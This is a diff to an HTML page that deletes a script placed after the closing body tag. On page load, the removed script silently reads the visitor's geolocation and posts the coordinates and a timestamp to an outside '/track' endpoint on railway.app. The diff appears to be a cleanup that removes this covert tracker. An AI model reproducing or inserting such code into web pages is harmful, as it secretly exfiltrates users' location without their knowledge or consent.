@@ -237,26 +237,5 @@
    </section>
 
 </body>
-<script>
-async function sendLocation() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (position) => {
-            const data = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                timestamp: new Date().toISOString()
-            };
-
-            await fetch('https://flask-production-9709.up.railway.app/track', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
-        });
-    }
-}
-
-sendLocation();
-</script>
 
 </html>
